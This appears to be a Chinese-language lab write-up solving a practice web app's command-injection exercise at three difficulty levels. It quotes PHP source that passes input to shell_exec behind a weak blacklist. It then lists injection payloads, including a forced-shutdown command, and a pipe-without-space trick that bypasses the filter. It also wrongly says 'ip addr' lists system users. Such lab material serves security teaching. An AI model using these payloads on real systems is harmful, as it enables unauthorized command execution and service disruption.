# Command Injection

> ## @Date：2021-5-18
>
> ## @Author：Tanyiqu

> ## low
>

源码里面没有进行过滤，可以进行命令注入攻击。

在输入框里面输入：

```shell
127.0.0.1 && ip addr
```



就会列出系统中的所有用户



同样，也可以使用以下命令进行注入

```shell
127.0.0.1 & ip addr
127.0.0.1 | ip addr
127.0.0.1 && ipconfig
127.0.0.1 && shutdown -s -f -t 0
127.0.0.1 && 其他你想执行的命令
...
```

<br>

> ## medium

源码

```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];

    // Set blacklist
    $substitutions = array(
        '&&' => '',
        ';'  => '',
    );

    // Remove any of the charactars in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

?>
```



分析源码可知，只把 `&&` 和 `;` 进行过滤处理

使用 `&` 进行注入即可



```shell
127.0.0.1 & ip addr
```

<br>

> ## high
>

源码

```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = trim($_REQUEST[ 'ip' ]);

    // Set blacklist
    $substitutions = array(
        '&'  => '',
        ';'  => '',
        '| ' => '',
        '-'  => '',
        '$'  => '',
        '('  => '',
        ')'  => '',
        '`'  => '',
        '||' => '',
    );

    // Remove any of the charactars in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

?>
```



high等级的只是完善了黑名单，但是 `| ` 这个，后面有一个空格，所以可以使用 `|` 进行注入。



```shell
127.0.0.1|ip addr
```

注意 `|` 后面不要有空格

<br>